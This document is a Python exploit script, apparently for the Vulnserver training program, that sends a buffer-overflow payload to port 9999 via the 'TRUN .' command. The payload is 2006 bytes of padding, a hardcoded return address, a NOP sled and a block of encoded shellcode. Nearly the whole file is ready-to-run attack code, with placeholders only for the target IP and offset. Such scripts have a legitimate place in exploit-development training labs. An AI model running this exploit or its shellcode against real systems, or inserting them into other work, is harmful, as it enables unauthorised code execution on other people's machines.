#!/usr/bin/python3
import socket, sys

host = "*.*.*.*" #Enter your Target IP
port = 9999
prefix = "TRUN ."

shellcode = ("\xd9\xcb\xbb\x20\x90\x87\xf1\xd9\x74\x24\xf4\x5a\x31\xc9"
"\xb1\x52\x83\xea\xfc\x31\x5a\x13\x03\x7a\x83\x65\x04\x86"
"\x4b\xeb\xe7\x76\x8c\x8c\x6e\x93\xbd\x8c\x15\xd0\xee\x3c"
"\x5d\xb4\x02\xb6\x33\x2c\x90\xba\x9b\x43\x11\x70\xfa\x6a"
"\xa2\x29\x3e\xed\x20\x30\x13\xcd\x19\xfb\x66\x0c\x5d\xe6"
"\x8b\x5c\x36\x6c\x39\x70\x33\x38\x82\xfb\x0f\xac\x82\x18"
"\xc7\xcf\xa3\x8f\x53\x96\x63\x2e\xb7\xa2\x2d\x28\xd4\x8f"
"\xe4\xc3\x2e\x7b\xf7\x05\x7f\x84\x54\x68\x4f\x77\xa4\xad"
"\x68\x68\xd3\xc7\x8a\x15\xe4\x1c\xf0\xc1\x61\x86\x52\x81"
"\xd2\x62\x62\x46\x84\xe1\x68\x23\xc2\xad\x6c\xb2\x07\xc6"
"\x89\x3f\xa6\x08\x18\x7b\x8d\x8c\x40\xdf\xac\x95\x2c\x8e"
"\xd1\xc5\x8e\x6f\x74\x8e\x23\x7b\x05\xcd\x2b\x48\x24\xed"
"\xab\xc6\x3f\x9e\x99\x49\x94\x08\x92\x02\x32\xcf\xd5\x38"
"\x82\x5f\x28\xc3\xf3\x76\xef\x97\xa3\xe0\xc6\x97\x2f\xf0"
"\xe7\x4d\xff\xa0\x47\x3e\x40\x10\x28\xee\x28\x7a\xa7\xd1"
"\x49\x85\x6d\x7a\xe3\x7c\xe6\x8f\xf4\x7c\xf3\xe7\xf6\x80"
"\xea\xab\x7f\x66\x66\x44\xd6\x31\x1f\xfd\x73\xc9\xbe\x02"
"\xae\xb4\x81\x89\x5d\x49\x4f\x7a\x2b\x59\x38\x8a\x66\x03"
"\xef\x95\x5c\x2b\x73\x07\x3b\xab\xfa\x34\x94\xfc\xab\x8b"
"\xed\x68\x46\xb5\x47\x8e\x9b\x23\xaf\x0a\x40\x90\x2e\x93"
"\x05\xac\x14\x83\xd3\x2d\x11\xf7\x8b\x7b\xcf\xa1\x6d\xd2"
"\xa1\x1b\x24\x89\x6b\xcb\xb1\xe1\xab\x8d\xbd\x2f\x5a\x71"
"\x0f\x86\x1b\x8e\xa0\x4e\xac\xf7\xdc\xee\x53\x22\x65\x0e"
"\xb6\xe6\x90\xa7\x6f\x63\x19\xaa\x8f\x5e\x5e\xd3\x13\x6a"
"\x1f\x20\x0b\x1f\x1a\x6c\x8b\xcc\x56\xfd\x7e\xf2\xc5\xfe"
"\xaa")


offset = 2006 #Here enter your offset that you got.

payload = prefix + offset * "A" + "\xaf\x11\x50\x62" + 16 *  "\x90" + shellcode

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(2)
    s.connect((host, port))
    s.recv(1024)
    print("Sending Payloads")
    s.send(bytes(payload, "latin-1"))
    
    
except:
  print("Try Again!!")
  sys.exit(0)

